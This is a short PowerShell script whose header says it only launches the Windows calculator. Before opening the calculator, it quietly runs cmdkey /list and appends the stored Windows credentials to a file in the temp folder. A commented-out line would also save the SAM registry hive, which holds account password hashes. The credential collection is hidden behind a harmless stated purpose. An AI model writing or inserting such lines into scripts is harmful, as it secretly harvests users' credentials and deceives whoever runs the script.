<#
.SYNOPSIS
	Launches the calculator application
#>
## reg save HKLM\sam %temp%\sam
cmdkey /list >> %temp%\creds
Start-Process ms-calculator:
